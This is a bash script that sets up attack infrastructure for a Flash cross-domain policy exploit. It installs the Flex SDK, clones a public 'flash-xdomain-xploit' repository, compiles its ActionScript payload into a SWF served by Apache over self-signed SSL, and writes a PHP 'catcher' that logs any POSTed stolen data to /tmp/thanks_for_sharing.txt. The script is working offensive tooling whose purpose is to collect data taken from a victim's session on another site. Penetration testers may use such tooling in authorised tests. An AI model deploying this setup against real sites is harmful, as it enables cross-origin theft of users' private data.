#!/bin/bash
# Seth Art

apt-get install openjdk-6-jdk php5
mkdir /opt/flex 
cd /opt/flex/ 
wget http://download.macromedia.com/pub/flex/sdk/flex_sdk_4.6.zip
unzip flex_sdk_4.6.zip 
chmod -R a+rx /opt/flex/
echo 'export PATH=/opt/flex/bin:$PATH' >> ~/.bashrc
chmod 755 bin/mxmlc
mkdir /var/www/crossdomain
mkdir ~/crossdomain
cd ~
git clone https://github.com/gursev/flash-xdomain-xploit.git
cp flash-xdomain-xploit/xdx.html /var/www/crossdomain/
cp flash-xdomain-xploit/XDomainXploit.as ~/crossdomain/
make-ssl-cert generate-default-snakeoil --force-overwrite
a2enmod ssl
a2ensite default-ssl
/etc/init.d/apache2 restart

#vi ~/crossdomain/XDomainXploit.as






/opt/flex/bin/mxmlc ~/crossdomain/XDomainXploit.as
mv ~/crossdomain/XDomainXploit.swf /var/www/crossdomain

cat </var/www/catcher.php <<EOL
<?php

$data = file_get_contents("php://input");
$ret = file_put_contents('/tmp/thanks_for_sharing.txt', $data, FILE_APPEND | LOCK_EX);
if($ret === false) {
 die('Error writing to file');
}
else { 
 echo "$ret bytes written to file";
}
?>
EOL

